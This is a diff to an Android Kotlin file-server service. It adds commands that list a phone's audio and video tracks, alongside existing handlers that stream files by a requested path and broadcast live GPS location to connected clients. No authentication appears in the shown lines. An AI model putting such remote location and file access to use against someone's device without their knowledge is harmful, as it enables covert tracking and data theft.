@@ -79,7 +79,7 @@ class LocalFileServerService : Service() {
         createNotificationChannel()
         registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
 
-        // Initialize telephony and live location manager
+        // Initialize telephony, storage, and live GPS location manager
         teleManager = TelephonyAndLocationManager(applicationContext)
         teleManager.onLocationUpdated = { locJson ->
             broadcastMessage(locJson.toString())
@@ -394,7 +394,24 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
-            // --- File Transfer ---
+            // --- Target 7: Music & Video Queries (Safe 50-Item Metadata) ---
+            "FETCH_AUDIO" -> {
+                val audioList = teleManager.getAudioTracks()
+                broadcastMessage(JSONObject().apply {
+                    put("type", "AUDIO_TRACKS_LIST")
+                    put("data", audioList)
+                }.toString())
+            }
+
+            "FETCH_VIDEOS" -> {
+                val videoList = teleManager.getVideoTracks()
+                broadcastMessage(JSONObject().apply {
+                    put("type", "VIDEO_TRACKS_LIST")
+                    put("data", videoList)
+                }.toString())
+            }
+
+            // --- File Transfer (Chunks also stream audio & video on-demand) ---
             "DOWNLOAD_FILE_CHUNK" -> {
                 val path = json.optString("path", "")
                 val offset = json.optLong("offset", 0L)
@@ -469,7 +486,7 @@ class LocalFileServerService : Service() {
                 }
             }
 
-            // --- Target 6: Location Request ---
+            // --- GPS Location Request ---
             "FETCH_LOCATION" -> {
                 broadcastMessage(teleManager.getLocation().toString())
             }
